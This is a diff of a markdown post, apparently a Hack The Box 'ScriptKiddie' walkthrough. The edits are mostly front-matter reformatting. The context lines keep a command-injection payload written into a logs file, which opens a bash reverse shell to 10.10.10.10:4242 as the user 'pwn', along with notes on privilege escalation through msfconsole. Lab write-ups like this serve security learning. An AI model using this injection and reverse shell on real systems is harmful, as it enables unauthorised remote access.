@@ -1,24 +1,26 @@
 ---
-date: 2021-06-05 16:00:00
-images: 
-- https://i.imgur.com/Egv2O1k.png
+title: 'Walktrough: HTB ScriptKiddie'
 language: en-US
 localeid: htb-scriptkiddie
+date: 2021-06-05T16:00:00.000Z
 tags:
-- HackTheBox
-- HTB Easy
-- HTB Linux
-- Walktrough
-title: 'Walktrough: HTB ScriptKiddie'
-authors: ['default']
+  - HackTheBox
+  - HTB Easy
+  - HTB Linux
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/Egv2O1k.png'
+authors:
+  - default
 ---
 
 Hello guys!
 
 This week's machine will be **ScriptKiddie**, another easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu), created by [0xdf](https://app.hackthebox.eu/users/4935).
 
-:information_source: **Info**:  Write-ups for Hack The Box machines are posted as soon as they’re retired.
-[info]
+\:information\_source: **Info**:  Write-ups for Hack The Box machines are posted as soon as they’re retired.
+\[info]
 
 ![HTB ScriptKiddie](https://i.imgur.com/Igno8wu.png)
 
@@ -147,7 +149,7 @@ As this script reads the content of a file in the current's user home directory 
 echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' #" > ~/logs/hackers
 ```
 
-After setting up a new listener and changing the `hackers` file with the above-mentioned content, another session was obtained, this time with the user `pwn` :smile:
+After setting up a new listener and changing the `hackers` file with the above-mentioned content, another session was obtained, this time with the user `pwn` \:smile:
 
 Enumerating the box again, this time with the new user account, noticed by running `linpeas.sh` that this user has access to start `msfconsole` in a privileged way.
 
@@ -178,4 +180,4 @@ msf6 >
 
 Hope this was somehow useful!
 
-See you in the next post :smiley:
+See you in the next post \:smiley:
